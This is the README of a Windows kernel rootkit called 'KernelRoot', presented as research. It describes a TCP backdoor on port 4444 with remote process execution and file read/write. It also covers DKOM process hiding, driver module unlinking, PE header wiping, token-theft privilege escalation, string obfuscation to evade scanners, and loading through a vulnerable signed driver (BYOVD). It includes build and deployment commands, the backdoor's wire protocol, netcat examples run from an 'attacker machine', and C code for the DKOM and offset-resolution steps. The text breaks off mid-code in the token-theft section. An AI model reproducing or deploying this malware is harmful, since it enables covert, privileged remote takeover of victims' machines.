# KernelRoot

**Windows Kernel-Mode Rootkit with TCP Backdoor and DKOM Stealth Capabilities**

A research-grade Windows kernel driver demonstrating advanced rootkit techniques including Direct Kernel Object Manipulation (DKOM), module list unlinking, PE header wiping, WSK-based TCP backdoor, and token theft privilege escalation.

---

## ⚠️ Disclaimer

**This project is for educational and authorized security research purposes only.**

- Use only in controlled lab environments you own or have explicit written permission to test
- Unauthorized deployment on production systems is illegal and unethical
- The authors assume no liability for misuse or damage caused by this software
- This code is provided as-is without warranty of any kind

---

## 📋 Table of Contents

- [Project Overview](#-project-overview)
- [Features](#-features)
- [Architecture](#-architecture)
- [File Listing (Complete)](#-file-listing-complete)
- [How Each Component Works](#-how-each-component-works)
- [Build System](#-build-system)
- [Configuration](#-configuration)
- [Deployment](#-deployment)
- [Command Reference](#-command-reference)
- [Protocol Specification](#-protocol-specification)
- [Technical Deep Dives](#-technical-deep-dives)
- [Detection & Mitigation](#-detection--mitigation)
- [Testing Checklist](#-testing-checklist)
- [References](#-references)

---

## 🎯 Project Overview

KernelRoot is a Windows kernel-mode rootkit that provides:

1. **TCP Backdoor** — Remote command execution via WSK (Winsock Kernel) on port 4444
2. **IOCTL Control Plane** — Local control via `\\.\KdmpRt` device symlink
3. **DKOM Stealth** — Hide processes from Task Manager, Process Explorer, EDR
4. **Privilege Escalation** — Token theft from SYSTEM process
5. **Module Unlinking** — Hide from `EnumDeviceDrivers` and `NtQuerySystemInformation`

### How It Works (High Level)

```
┌──────────────────────────────────────────────────────────────────────┐
│                        KERNEL MODE (Ring 0)                          │
│                                                                      │
│  ┌─────────────┐   ┌─────────────┐   ┌──────────────────────────┐  │
│  │  DriverEntry │   │   WSK TCP   │   │    IOCTL Dispatch        │  │
│  │  (startup)   │──►│  Listener   │   │    (local client)        │  │
│  └─────────────┘   │  Port 4444  │   └────────────┬─────────────┘  │
│                     └──────┬──────┘                │                 │
│                            │                       │                 │
│                            └───────────┬───────────┘                 │
│                                        ▼                             │
│                            ┌──────────────────────┐                  │
│                            │   dispatch_command() │                  │
│                            │   (shared logic)     │                  │
│                            └──────────┬───────────┘                  │
│                                       │                              │
│                    ┌──────────────────┼──────────────────┐           │
│                    ▼                  ▼                  ▼           │
│              ┌──────────┐      ┌──────────┐      ┌──────────┐      │
│              │ Process  │      │  Stealth │      │  File    │      │
│              │ Operations│     │  (DKOM)  │      │  I/O     │      │
│              └──────────┘      └──────────┘      └──────────┘      │
└──────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌──────────────────────────────────────────────────────────────────────┐
│                        USER MODE (Ring 3)                            │
│                                                                      │
│  controller.exe (IOCTL)     │    netcat / custom TCP client         │
│  - ping, exec, ps, hide,    │    - Connect to port 4444            │
│    unhide, elevate, unload  │    - Send binary framed commands     │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 🎯 Features

### Core Capabilities

| Feature | Description | File(s) |
|---------|-------------|---------|
| **TCP Backdoor** | WSK-based listener on configurable port (default 4444), binds to all interfaces | `socket.c` |
| **Process Execution** | Launch arbitrary processes via `ZwCreateUserProcess` from kernel context | `commands.c` |
| **Process Enumeration** | List all processes (including hidden) via kernel EPROCESS traversal | `commands.c`, `process.c` |
| **File Read/Write** | Arbitrary file I/O with kernel privileges (bypasses ACLs) | `commands.c` |
| **Process Termination** | Kill any process by PID using `ZwTerminateProcess` | `commands.c` |
| **DKOM Process Hiding** | Unlink from `ActiveProcessLinks` — invisible to Task Manager, Process Explorer, `ps`, EDR user-mode sensors | `dkom.c` |
| **Token Theft (Elevation)** | Steal SYSTEM token from target PID (e.g., `lsass.exe` PID 4) to elevate current context | `process.c` |
| **Driver Unload** | Clean unload via IOCTL or TCP command, with service key deletion | `commands.c`, `driver.c` |
| **Module List Unlinking** | Hide from `EnumDeviceDrivers` and `NtQuerySystemInformation(SystemModuleInformation)` | `stealth.c`, `dkom.c` |
| **PE Header Wipe** | Overwrite first 4KB (DOS/NT headers) to defeat memory scanners | `stealth.c` |
| **String Obfuscation** | XOR encryption of string literals at compile time | `obfuscate.c`, `xorstr.py` |
| **Export Hashing** | FNV-1a 64-bit hash for runtime API resolution without symbol names | `utils.h`, `obfuscate.c` |
| **BYOVD Loader** | Load unsigned driver via vulnerable signed driver (kdmapper-style) | `loader.c` |

### Stealth Mechanisms

| Mechanism | Purpose | Reversibility |
|-----------|---------|---------------|
| **PsLoadedModuleList Unlink** | Hide from `NtQuerySystemInformation(SystemModuleInformation)`, `EnumDeviceDrivers` | ✅ Relinkable on unload (configurable) |
| **DriverSection Zeroing** | Break `EnumDeviceDrivers` / driver object scans | ✅ Restored on unload |
| **PE Header Wipe** | Overwrite first 4KB (DOS/NT headers) to defeat memory scanners | ❌ Irreversible (optional, disabled by default) |
| **Device Object Hiding** | Remove from `DriverObject->DeviceObject` chain | ✅ Restored on unload |
| **ActiveProcessLinks Poisoning** | Self-referential links crash walkers that land on hidden entries | ✅ Restored on unhide |

### Communication Channels

1. **IOCTL Control Plane** — Local usermode client (`controller.exe`) via `\\.\KdmpRt`
2. **TCP Backdoor** — Remote access via raw TCP (WSK), custom binary framing
3. **BYOVD Loader** — Load unsigned driver via vulnerable signed driver (e.g., Intel `iqvw64e.sys`)

---

## 🏗️ Architecture

### Initialization Flow

```
DriverEntry() [driver.c]
    │
    ├─► device_set_dispatch(drv)
    │     └─ Sets all MajorFunction[] to dispatch_create_close
    │     └─ Overrides IRP_MJ_DEVICE_CONTROL → ioctl_dispatch()
    │
    ├─► resolve_eprocess_offsets() [process.c]
    │     └─ Scans PsInitialSystemProcess (PID 4)
    │     └─ Finds UniqueProcessId, ActiveProcessLinks, Token, ImageFileName
    │     └─ Stores in g_EprocOffsets (global offset table)
    │
    ├─► dkom_init() [dkom.c]
    │     └─ Initializes hidden process side-table (64 slots)
    │     └─ Initializes spinlock for thread-safe DKOM operations
    │
    ├─► device_create() [device.c]
    │     └─ Creates \\Device\\KdmpRt device object
    │     └─ Creates \\??\\KdmpRt symbolic link (user-mode access)
    │
    ├─► socket_init() [socket.c]
    │     └─ Registers WSK client
    │     └─ Captures WSK provider NPI
    │
    ├─► PsCreateSystemThread() → listener_thread() [socket.c]
    │     └─ Binds to 0.0.0.0:4444
    │     └─ Enters accept loop
    │     └─ Each client → handle_client() → dispatch_command()
    │
    └─► stealth_init() [stealth.c]
          └─ Unlinks from PsLoadedModuleList
          └─ Zeroes DriverSection pointer
          └─ (Optional) Wipes PE headers
```

### Command Dispatch Flow

```
TCP Client / controller.exe
         │
         ▼
┌─────────────────────────────────────────────────────┐
│  Socket: handle_client() [socket.c]                 │
│    ├─ Read 4-byte length prefix                     │
│    ├─ Read body (cmd + payload)                     │
│    └─ dispatch_command(body, ...)                   │
│                                                     │
│  IOCTL: ioctl_dispatch() [ioctl.c]                  │
│    ├─ Map IOCTL code → CMD_* code                   │
│    └─ dispatch_command(cmd_byte + payload, ...)     │
└─────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────┐
│  dispatch_command() [commands.c]                    │
│                                                     │
│  switch (cmd) {                                     │
│    CMD_PING    → "pong"                             │
│    CMD_EXEC    → ZwCreateUserProcess()              │
│    CMD_PS      → enum_processes() → RK_PROC_ENTRY[] │
│    CMD_READ    → ZwCreateFile + ZwReadFile          │
│    CMD_WRITE   → ZwCreateFile + ZwWriteFile         │
│    CMD_KILL    → ZwTerminateProcess()               │
│    CMD_HIDE    → hide_process() [dkom.c]            │
│    CMD_UNHIDE  → unhide_process() [dkom.c]          │
│    CMD_ELEVATE → elevate_current_to_pid() [process] │
│    CMD_UNLOAD  → signal g_unload_event              │
│  }                                                  │
└─────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────┐
│  Socket: wsk_send_sync() [socket.c]                 │
│    ├─ Prepend 4-byte length prefix                  │
│    └─ Send response to client                       │
└─────────────────────────────────────────────────────┘
```

### DKOM (Direct Kernel Object Manipulation) Flow

```
hide_process(pid) [dkom.c]
    │
    ├─► find_process_by_pid(pid) [dkom.c]
    │     └─ Walks ActiveProcessLinks from System process
    │     └─ Compares UniqueProcessId at resolved offset
    │
    ├─► Acquire spinlock (g_hidden_lock)
    │
    ├─► Save original FLINK/BLINK in side-table
    │     └─ g_hidden[slot].flink = links->Flink
    │     └─ g_hidden[slot].blink = links->Blink
    │
    ├─► Unlink from ActiveProcessLinks
    │     └─ Flink->Blink = Blink  (previous node points forward)
    │     └─ Blink->Flink = Flink  (next node points backward)
    │
    ├─► Poison own links (self-referential)
    │     └─ links->Flink = &links->Flink  (crash on traversal)
    │     └─ links->Blink = &links->Blink
    │
    └─► Release spinlock

unhide_process(pid) [dkom.c]
    │
    ├─► Find side-table entry by PID
    │
    ├─► Acquire spinlock
    │
    ├─► Restore saved FLINK/BLINK
    │     └─ links->Flink = saved_flink
    │     └─ links->Blink = saved_blink
    │     └─ saved_flink->Blink = links
    │     └─ saved_blink->Flink = links
    │
    ├─► Clear side-table entry
    │
    └─► Release spinlock
```

### WSK (Winsock Kernel) Flow

```
socket_init() [socket.c]
    │
    ├─► WskRegister() — Register WSK client
    └─► WskCaptureProviderNPI() — Get WSK provider dispatch table

listener_thread() [socket.c]
    │
    ├─► WskSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, WSK_FLAG_LISTEN_SOCKET)
    ├─► WskBind(0.0.0.0:4444)
    └─► WskListen()
    │
    └─► Accept Loop:
          ├─► Check g_unload_event (for clean shutdown)
          ├─► WskAccept() — Blocks until client connects
          │     └─ Uses IRP + completion routine + KEVENT
          │     └─ 1-second timeout for unload flag checking
          │
          └─► handle_client() [socket.c]
                ├─► Allocate rbuf + wbuf (64KB each)
                │
                └─► Command Loop:
                      ├─► wsk_recv_sync(rbuf, 4) — Read length prefix
                      ├─► wsk_recv_sync(rbuf, len) — Read body
                      ├─► dispatch_command(rbuf, len, wbuf+4, ...)
                      ├─► wsk_send_sync(wbuf, 4+resp_len) — Send response
                      └─► Loop until error or client disconnect

socket_deinit() [socket.c]
    ├─► KeSetEvent(g_unload_event) — Signal thread to exit
    ├─► KeDelayExecutionThread(100ms) — Wait for thread to observe
    ├─► WskReleaseProviderNPI() — Release provider
    └─► WskDeregister() — Deregister WSK client
```

---

## 📁 File Listing (Complete)

### Root Directory

```
KernelRoot/
├── README.md                          ← This file (documentation)
├── inc/                               ← Public headers
│   ├── common.h                       ← Shared IOCTL codes + wire protocol
│   ├── config.h                       ← Build-time configuration
│   └── undoc.h                        ← Undocumented kernel structures
├── src/                               ← Kernel driver source
│   ├── commands.c                     ← Command dispatcher (TCP + IOCTL)
│   ├── device.c                       ← Device object + dispatch table
│   ├── dkom.c                         ← DKOM (hide/unhide processes)
│   ├── driver.c                       ← DriverEntry / DriverUnload
│   ├── hook.c                         ← Hooking scaffolding (SSDT, IRP)
│   ├── ioctl.c                        ← IOCTL dispatch → commands
│   ├── memory.c                       ← Pool allocation wrappers
│   ├── obfuscate.c                    ← String XOR + export hashing
│   ├── process.c                      ← EPROCESS offsets + token theft
│   ├── socket.c                       ← WSK TCP listener
│   ├── stealth.c                      ← Module unlink + PE header wipe
│   └── utils.h                        ← Macros, logging, helpers
├── usermode/                          ← Usermode tools
│   ├── controller.c                   ← IOCTL CLI client
│   └── loader.c                       ← BYOVD manual mapper
└── build/                             ← Build artifacts
    ├── build.bat                      ← Build script
    ├── rootkit.inf                    ← INF for driver install
    ├── rootkit.vcxproj                ← Visual Studio project
    ├── rootkit.vcxproj.filters        ← VS filters
    └── xorstr.py                      ← String obfuscation preprocessor
```

### Detailed File Descriptions

#### `inc/common.h` — Shared IOCTL Codes + Wire Protocol

This header defines the communication protocol between the kernel driver and usermode clients. It contains:

- **IOCTL Device Type**: `0x8A53` (arbitrary, must match in driver and controller)
- **IOCTL Codes**: 7 IOCTL codes for each command (PING, EXEC, PS, HIDE, UNHIDE, ELEVATE, UNLOAD)
- **TCP Command Codes**: 10 command codes for the wire protocol (0x01–0x0A)
- **Wire Framing Structures**:
  - `RK_HDR` — Generic header with 4-byte length field
  - `RK_REQ` — Request frame: `[u32 length][u8 cmd][payload...]`
  - `RK_RESP` — Response frame: `[u32 length][payload...]`
  - `RK_PROC_ENTRY` — Process record: 24 bytes (PID + image name)

#### `inc/config.h` — Build-Time Configuration

This file contains all compile-time constants that can be modified per-build:

- **Network**: `BIND_IP_OCTETS` (0.0.0.0), `BACKDOOR_PORT` (4444)
- **Device**: `DEVICE_NAME` (\\Device\\KdmpRt), `SYMLINK_NAME` (\\??\\KdmpRt)
- **Pool Tag**: `POOL_TAG` ('Kdmp' = 0x706D644B)
- **Obfuscation**: `XOR_KEY` (0x5A) — Per-build XOR key for string encryption
- **Stealth**: `RELINK_ON_UNLOAD` (1) — Relink module list on unload
- **Limits**: `LISTENER_STACK_SIZE`, `NET_BUF_MAX`, `FILE_CHUNK_MAX`, `WSK_RETRY_MAX`

#### `inc/undoc.h` — Undocumented Kernel Structures

This header provides:

- **Partial EPROCESS View**: Only the fields we touch (opaque structure)
- **EPROCESS_OFFSETS Structure**: Runtime-calibrated offsets for:
  - `UniqueProcessId` — PID field
  - `ActiveProcessLinks` — Doubly-linked list of all processes
  - `Token` — EX_FAST_REF to primary token
  - `ImageFileName` — 15-character process name
  - `InheritedFromUniqueProcessId` — Parent PID (best-effort)
- **Convenience Accessors**: Inline functions using resolved offsets:
  - `rk_process_id(eprocess)` — Get PID
  - `rk_active_links(eprocess)` — Get ActiveProcessLinks pointer
  - `rk_token_slot(eprocess)` — Get Token pointer
  - `rk_image_name(eprocess)` — Get process name

#### `src/driver.c` — Driver Entry/Exit

The main lifecycle file:

- **DriverEntry()**: Initialization sequence:
  1. Set `DriverUnload` + dispatch table
  2. Calibrate EPROCESS offsets (`resolve_eprocess_offsets()`)
  3. Initialize DKOM side-table (`dkom_init()`)
  4. Create device + symlink (`device_create()`)
  5. Initialize WSK (`socket_init()`)
  6. Start listener thread (`PsCreateSystemThread()`)
  7. Apply stealth (`stealth_init()`)
  8. Optional: Wipe PE headers (commented out by default)

- **driver_unload()**: Teardown sequence:
  1. Signal listener thread, close WSK (`socket_deinit()`)
  2. Wait for listener thread termination
  3. Delete device + symlink (`device_destroy()`)
  4. Stealth teardown (`stealth_deinit()`)

#### `src/device.c` — Device Object + Dispatch Table

- **device_create()**: Creates `\\Device\\KdmpRt` device object + `\\??\\KdmpRt` symbolic link
- **device_destroy()**: Deletes symbolic link and device object
- **device_set_dispatch()**: Initializes all `MajorFunction[]` entries:
  - `IRP_MJ_CREATE`, `IRP_MJ_CLOSE`, `IRP_MJ_CLEANUP` → `dispatch_create_close`
  - `IRP_MJ_DEVICE_CONTROL` → `ioctl_dispatch`

#### `src/ioctl.c` — IOCTL Dispatch

Maps IOCTL codes to TCP command codes and calls `dispatch_command()`:

- **IOCTL_ROOTKIT_PING** (0x800) → `CMD_PING`
- **IOCTL_ROOTKIT_EXEC** (0x801) → `CMD_EXEC`
- **IOCTL_ROOTKIT_PS** (0x802) → `CMD_PS`
- **IOCTL_ROOTKIT_HIDE** (0x803) → `CMD_HIDE`
- **IOCTL_ROOTKIT_UNHIDE** (0x804) → `CMD_UNHIDE`
- **IOCTL_ROOTKIT_ELEVATE** (0x805) → `CMD_ELEVATE`
- **IOCTL_ROOTKIT_UNLOAD** (0x806) → `CMD_UNLOAD` + delete service key

#### `src/commands.c` — Core Command Dispatcher

The heart of the rootkit — shared logic for both TCP and IOCTL paths:

- **CMD_PING** (0x01): Returns "pong" (keepalive)
- **CMD_EXEC** (0x02): Executes process via `ZwCreateUserProcess`
- **CMD_PS** (0x03): Lists all processes via EPROCESS traversal
- **CMD_READ** (0x04): Reads file content (kernel privileges)
- **CMD_WRITE** (0x05): Writes file at offset (kernel privileges)
- **CMD_KILL** (0x06): Terminates process via `ZwTerminateProcess`
- **CMD_HIDE** (0x07): DKOM hide process (unlink from ActiveProcessLinks)
- **CMD_UNHIDE** (0x08): DKOM unhide process (restore links)
- **CMD_ELEVATE** (0x09): Token theft (steal SYSTEM token)
- **CMD_UNLOAD** (0x0A): Signals unload event + deletes service key

#### `src/dkom.c` — DKOM (Direct Kernel Object Manipulation)

Implements process hiding/unhiding and driver module list manipulation:

- **Side-table**: 64-slot array storing original FLINK/BLINK for hidden processes
- **hide_process()**: Unlink from `ActiveProcessLinks` + poison own links
- **unhide_process()**: Restore saved FLINK/BLINK from side-table
- **find_process_by_pid()**: Walk `ActiveProcessLinks` to find EPROCESS by PID
- **hide_driver_from_loaded_modules()**: Unlink from `PsLoadedModuleList`
- **relink_driver_loaded_modules()**: Restore module list entry

#### `src/stealth.c` — Stealth Mechanisms

Implements driver-side stealth:

- **stealth_init()**: Unlink from `PsLoadedModuleList` + zero `DriverSection`
- **stealth_wipe_headers()**: Overwrite first 4KB of driver image (irreversible)
  - Uses MDL (Memory Descriptor List) to map read-only pages as writable
  - Wipes DOS header ("MZ"), NT headers ("PE\0\0"), section table
  - Leaves fake DOS header (e_magic = 0) to avoid blank page detection
- **stealth_deinit()**: Relink module list if `RELINK_ON_UNLOAD=1`

#### `src/socket.c` — WSK TCP Listener

Uses Winsock Kernel (WSK) for the TCP backdoor:

- **socket_init()**: Register WSK client + capture provider NPI
- **socket_deinit()**: Signal unload + release provider
- **listener_thread()**: System thread that:
  1. Binds to `0.0.0.0:4444`
  2. Enters accept loop (1-second timeout for unload checking)
  3. Each client → `handle_client()` → `dispatch_command()`
- **handle_client()**: Command loop:
  1. Read 4-byte length prefix
  2. Read body (cmd + payload)
  3. Call `dispatch_command()`
  4. Send response (length + payload)
- **IRP Synchronization**: Each WSK operation uses a `WSK_OP` structure with `KEVENT` for completion notification

#### `src/process.c` — EPROCESS Offset Resolution + Token Theft

- **resolve_eprocess_offsets()**: Dynamic offset calibration:
  1. Scan `PsInitialSystemProcess` (PID 4) for `UniqueProcessId == 4`
  2. Validate `ActiveProcessLinks` (FLINK↔BLINK consistency)
  3. Find `Token` via `PsReferencePrimaryToken()` scan
  4. Find `ImageFileName` via "System\0" literal search
- **enum_processes()**: Walk `ActiveProcessLinks` list, write `RK_PROC_ENTRY` records
- **elevate_current_to_pid()**: Token theft:
  1. Reference target's primary token
  2. Reference current process's primary token
  3. Atomically swap token pointer (preserve EX_FAST_REF low 3 bits)
  4. Dereference old token

#### `src/memory.c` — Pool Allocation Wrappers

- **rk_alloc()**: Allocate NonPagedPoolNx with tag
- **rk_alloc_zero()**: Allocate + zero-initialize
- **rk_free()**: Free with tag verification
- **rk_secure_free()**: Secure wipe + free (prevents data leakage)
- **rk_unicode_from_bytes()**: Convert raw UTF-16LE bytes to `UNICODE_STRING`
- **rk_unicode_free()**: Secure free `UNICODE_STRING` buffer

#### `src/obfuscate.c` — String Obfuscation + Export Hashing

- **rk_xor_decrypt()**: Decrypt XOR-encrypted string literals at runtime
- **find_nt_base()**: Walk `PsLoadedModuleList` to find ntoskrnl.exe base
- **rk_resolve_nt()**: Parse ntoskrnl export directory, match FNV-1a hash

#### `src/utils.h` — Macros + Logging

- **RK_DBG()**: Debug print (only in debug builds, zero overhead in release)
- **RK_TRY()**: Status short-circuit macro (return on failure)
- **XORSTR()**: String obfuscation macro (degrades to plain string without preprocessor)
- **rk_fnv1a()**: FNV-1a 64-bit hash function (case-insensitive)

#### `src/hook.c` — Hooking Scaffolding (Disabled)

Placeholder for future hooking capabilities:

- **SSDT Hook**: Service Descriptor Table hook (requires hypervisor for KPP bypass)
- **IRP Hook**: Replace `DriverObject->MajorFunction` entries

#### `usermode/controller.c` — IOCTL CLI Client

Usermode tool that communicates with the driver via IOCTLs:

- **Commands**: ping, exec, ps, hide, unhide, elevate, unload
- **Requirements**: Administrator privileges
- **Build**: `cl /O2 /W3 controller.c /link ws2_32.lib`

#### `usermode/loader.c` — BYOVD Manual Mapper

Load unsigned driver via vulnerable signed driver (kdmapper-style):

- **Vulnerable Driver**: Intel `iqvw64e.sys` (\\.\Nal)
- **Pipeline**:
  1. Open handle to vulnerable driver
  2. Read target .sys from disk
  3. Allocate kernel memory via vulnerable driver primitive
  4. Copy PE sections to allocated region
  5. Apply base relocations
  6. Resolve imports against ntoskrnl exports
  7. Call DriverEntry at mapped base

#### `build/build.bat` — Build Script

1. Run `xorstr.py` to encrypt `XORSTR("...")` literals in-place
2. Build WDK project via `msbuild`
3. (Optional) Test-sign the driver with `signtool`

#### `build/xorstr.py` — String Obfuscation Preprocessor

- Scans all `.c` files for `XORSTR("literal")`
- Rewrites as encrypted byte arrays + runtime decrypt calls
- Uses `XOR_KEY` from `config.h` (default 0x5A)

#### `build/rootkit.inf` — INF for Driver Installation

Standard Windows INF file for driver installation:
- Class: System
- Service: KdmpRt (kernel driver, demand start)
- Binary: rootkit.sys → System32\drivers

---

## ⚙️ Build System

### Prerequisites

- **Windows 10/11 SDK** (10.0.19041.0+ recommended)
- **WDK** (Windows Driver Kit) matching target OS version
- **Visual Studio 2022** with "Desktop development with C++" + "Windows Driver Kit" workloads
- **Python 3.x** (for `xorstr.py`)
- **x64** target only (no x86/ARM64 support currently)

### Build Steps

```cmd
REM 1. Open "x64 Native Tools Command Prompt for VS 2022"
REM 2. Navigate to project root
cd C:\path\KernelRoot

REM 3. Run the build script (generates randomized symlink, applies XOR key)
build\build.bat
```

### Build Output

```
build\
├── x64\
│   └── Release\
│       └── rootkit.sys          ← Signed/unsigned driver binary
├── rootkit.inf                  ← INF for manual install (test signing required)
├── rootkit.vcxproj              ← VS project (for IDE builds)
├── rootkit.vcxproj.filters      ← VS filters
└── xorstr.py                    ← String obfuscation preprocessor
```

### Building the Controller

```cmd
REM From x64 Native Tools Prompt
cl /O2 /W3 usermode\controller.c /link ws2_32.lib
```

### Building the Loader (BYOVD)

```cmd
REM From x64 Native Tools Prompt
cl /O2 /W3 usermode\loader.c /link advapi32.lib
```

---

## ⚙️ Configuration

### `inc/config.h` Reference

| Constant | Default | Description |
|----------|---------|-------------|
| `BIND_IP_OCTETS` | `{0,0,0,0}` | Listen address (INADDR_ANY = all interfaces) |
| `BACKDOOR_PORT` | `4444` | TCP backdoor port (host byte order) |
| `DEVICE_NAME` | `\\Device\\KdmpRt` | Kernel device object name |
| `SYMLINK_NAME` | `\\??\\KdmpRt` | User-mode symlink (randomized per-build by `build.bat`) |
| `POOL_TAG` | `'Kdmp'` | Pool allocation tag (NonPagedPoolNx) |
| `XOR_KEY` | `0x5A` | Per-build string XOR key (rewritten by `build.bat`) |
| `RELINK_ON_UNLOAD` | `1` | Relink module list on unload (0 = permanent unlink) |
| `LISTENER_STACK_SIZE` | `0x4000` | System thread stack (16 KB) |
| `NET_BUF_MAX` | `0x10000` | Max command/response buffer (64 KB) |
| `FILE_CHUNK_MAX` | `0x400000` | Max file read/write chunk (4 MB) |
| `WSK_RETRY_MAX` | `3` | Retry count for transient WSK IRP failures |

> **Important**: After modifying `config.h`, re-run `build\build.bat` to regenerate randomized symlink and apply XOR key.

---

## 🚀 Deployment

### Test Signing Mode (Required for Unsigned Drivers)

```cmd
REM Enable test signing (requires reboot)
bcdedit /set testsigning on
REM Disable after testing
bcdedit /set testsigning off
```

### Manual Installation (Path A: INF)

```cmd
REM 1. Copy driver to system32\drivers
copy build\x64\Release\rootkit.sys C:\Windows\System32\drivers\KdmpRt.sys

REM 2. Create service
sc create KdmpRt type= kernel binPath= C:\Windows\System32\drivers\KdmpRt.sys

REM 3. Start driver
sc start KdmpRt

REM 4. Verify
sc query KdmpRt
```

### Manual Installation (Path B: BYOVD Loader)

```cmd
REM 1. Ensure vulnerable driver is loaded (e.g., iqvw64e.sys)
REM 2. Run loader
loader.exe build\x64\Release\rootkit.sys

REM 3. DriverEntry is called automatically at mapped base
```

### Using the Controller

```cmd
REM Run as Administrator
controller.exe ping
controller.exe ps
controller.exe exec C:\Windows\System32\cmd.exe
controller.exe hide 1234
controller.exe unhide 1234
controller.exe elevate 4
controller.exe unload
```

### Remote TCP Access

```bash
# Connect from attacker machine
nc -v TARGET_IP 4444

# Send framed commands (see Protocol Specification)
# Example: CMD_PING (0x01)
printf '\x05\x00\x00\x00\x01' | nc TARGET_IP 4444
```

---

## 📖 Command Reference

### IOCTL Commands (`controller.exe`)

| Command | IOCTL Code | Description | Example |
|---------|------------|-------------|---------|
| `ping` | `0x8A53 << 16 \| 0x800` | Test connectivity | `controller.exe ping` |
| `exec <path>` | `0x8A53 << 16 \| 0x801` | Launch process (UTF-16LE) | `controller.exe exec C:\Windows\System32\cmd.exe` |
| `ps` | `0x8A53 << 16 \| 0x802` | List processes | `controller.exe ps` |
| `hide <pid>` | `0x8A53 << 16 \| 0x803` | DKOM hide process | `controller.exe hide 1234` |
| `unhide <pid>` | `0x8A53 << 16 \| 0x804` | Restore hidden process | `controller.exe unhide 1234` |
| `elevate <pid>` | `0x8A53 << 16 \| 0x805` | Token theft to target PID | `controller.exe elevate 4` |
| `unload` | `0x8A53 << 16 \| 0x806` | Unload driver + delete service key | `controller.exe unload` |

### TCP Wire Commands

| Code | Name | Payload | Response |
|------|------|---------|----------|
| `0x01` | `CMD_PING` | (none) | `"pong"` |
| `0x02` | `CMD_EXEC` | UTF-16LE path (NUL-terminated) | `"exec=0xXXXXXXXX"` |
| `0x03` | `CMD_PS` | (none) | Binary `RK_PROC_ENTRY[]` |
| `0x04` | `CMD_READ` | UTF-16LE path | File bytes / `"read=0xXXXXXXXX"` |
| `0x05` | `CMD_WRITE` | `[u32 offset][UTF-16LE path][data]` | `"write=0xXXXXXXXX"` |
| `0x06` | `CMD_KILL` | `u32 PID` | `"kill=0xXXXXXXXX"` |
| `0x07` | `CMD_HIDE` | `u32 PID` | `"hide=0xXXXXXXXX"` |
| `0x08` | `CMD_UNHIDE` | `u32 PID` | `"unhide=0xXXXXXXXX"` |
| `0x09` | `CMD_ELEVATE` | `u32 PID` | `"elevate=0xXXXXXXXX"` |
| `0x0A` | `CMD_UNLOAD` | (none) | `"unloading"` |

---

## 🔧 Protocol Specification

### Wire Framing (TCP)

```
REQUEST (Client → Server):
  [u32 length LE] [u8 cmd] [payload...]
  └──────────────┘ └──┬──┘ └────────┘
        length = 1 + payload_len

RESPONSE (Server → Client):
  [u32 length LE] [payload...]
  └──────────────┘ └────────┘
        length = payload_len
```

- All integers are **little-endian**
- Length field counts bytes **after** the length field itself
- UTF-16LE strings are **null-terminated** (2-byte NUL)

### Example: CMD_PING

```python
# Request: length=1, cmd=0x01
b'\x01\x00\x00\x00\x01'

# Response: length=4, payload="pong"
b'\x04\x00\x00\x00pong'
```

### Example: CMD_EXEC (launch notepad)

```python
path = "C:\\Windows\\System32\\notepad.exe".encode('utf-16le') + b'\x00\x00'
payload = b'\x02' + path
length = len(payload).to_bytes(4, 'little')
request = length + payload
```

### Example: CMD_PS

```python
# Request: length=1, cmd=0x03
request = b'\x01\x00\x00\x00\x03'

# Response: length = N * 24, payload = RK_PROC_ENTRY[]
# Each entry: u32 pid + u32 ppid + u8[16] image = 24 bytes
```

### Process Entry (CMD_PS Response)

```c
#pragma pack(1)
typedef struct _RK_PROC_ENTRY {
    u32 pid;           // Process ID
    u32 ppid;          // Parent PID (currently 0)
    u8  image[16];     // Image name, null-terminated, max 15 chars
} RK_PROC_ENTRY;       // Total: 24 bytes
#pragma pack()
```

### IOCTL Framing

IOCTLs use `METHOD_BUFFERED` with `FILE_ANY_ACCESS`:

- **Input**: `irp->AssociatedIrp.SystemBuffer`
- **Output**: `irp->AssociatedIrp.SystemBuffer`
- **Input Length**: `sp->Parameters.DeviceIoControl.InputBufferLength`
- **Output Length**: `sp->Parameters.DeviceIoControl.OutputBufferLength`

---

## 🔬 Technical Deep Dives

### Dynamic EPROCESS Offset Resolution

The driver resolves offsets at runtime by scanning `PsInitialSystemProcess` (PID 4):

```c
// Step 1: Find UniqueProcessId (PID)
// Scan for ULONG64 == 4, validate LIST_ENTRY consistency
for (ULONG off = 0x100; off < 0x900; off += 8) {
    ULONG64 v = *(ULONG64*)(p + off);
    if (v != 4) continue;  // Not PID 4

    ULONG64 flink = *(ULONG64*)(p + off + 8);
    ULONG64 blink = *(ULONG64*)(p + off + 16);

    // Validate kernel pointers (canonical address space)
    if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;

    // FLINK->Blink must point back at our ActiveProcessLinks
    ULONG64 back = *(ULONG64*)(flink + 8);
    if (back != (ULONG64)(p + off + 8)) continue;

    pid_off = off;
    break;
}

// Step 2: Find Token via PsReferencePrimaryToken
PACCESS_TOKEN sys_token = PsReferencePrimaryToken(g_SystemProcess);
ULONG64 masked_tok = ((ULONG64)sys_token) & ~0x7ULL;  // Clear EX_FAST_REF low bits
// Scan EPROCESS for matching token pointer

// Step 3: Find ImageFileName ("System\0")
for (ULONG off = 0x400; off < 0x900 - 16; off++) {
    if (RtlCompareMemory(p + off, "System", 7) == 7) {
        g_EprocOffsets.ImageFileName = off;
        break;
    }
}
```

### DKOM Process Hiding

```c
// Hide: unlink from ActiveProcessLinks
PLIST_ENTRY f = links->Flink;  // Next node
PLIST_ENTRY b = links->Blink;  // Previous node

// Unlink: make previous point to next, and vice versa
f->Blink = b;  // Next's previous = Previous
b->Flink = f;  // Previous's next = Next

// Poison own links (self-referential)
// Any walker that lands here will crash (access violation)
links->Flink = (PLIST_ENTRY)&links->Flink;
links->Blink = (PLIST_ENTRY)&links->Blink;

// Unhide: restore from side-table
links->Flink = saved_flink;
links->Blink = saved_blink;
saved_flink->Blink = links;
saved_blink->Flink = links;
```

### Token Theft (Privilege Escalation)

```c
// 1. Reference target's primary token (e.g., SYSTEM = PID 4)
PACCESS_TOKEN new_tok = PsReferencePrimaryToken(target);

// 2. Reference current process's primary token
PACCESS_TOKEN old_tok = PsReferencePrimaryToken(current);

// 3. Get pointer to token slot in EPROCESS
